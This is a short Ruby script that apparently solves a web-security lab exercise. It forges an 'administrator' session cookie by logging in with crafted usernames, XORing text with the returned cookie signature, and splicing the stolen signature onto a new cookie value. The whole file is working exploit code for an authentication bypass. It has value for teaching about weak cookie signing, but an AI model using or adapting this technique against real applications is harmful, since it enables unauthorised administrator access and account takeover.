require 'uri'
require 'base64'
require 'httparty'

URL = "http://ptl-152b5a7a-14d18575.libcurl.so/"

def login(username)
	res = HTTParty.post(URL+'login.php', body: {username: username, password: 'Password1'}, follow_redirects: false)
	return res.headers["set-cookie"].split("=")[1]
end

cookie1 = Base64.decode64(login("administ"))
signature1 = cookie1.split("--")[1]

def xor(str1, str2)
	ret = ""
	str1.split(//).each_with_index do |c, i|
		ret[i] = (str1[i].ord ^ str2[i].ord).chr
	end
	return ret
end
r2 = login(xor("rator\0\0\0",signature1)).gsub("%2B","+")
puts r2
cookie2 = Base64.decode64(r2)
signature2 = cookie2.split("--")[1]

winner = Base64.strict_encode64("administrator--" + signature2)

puts "Login1 -- Cookie: "+cookie1+"\r\nsig: "+signature1
puts "Login2 -- Cookie: "+cookie2+"\r\nsig2: "+signature2+"\r\nWinner:  "+winner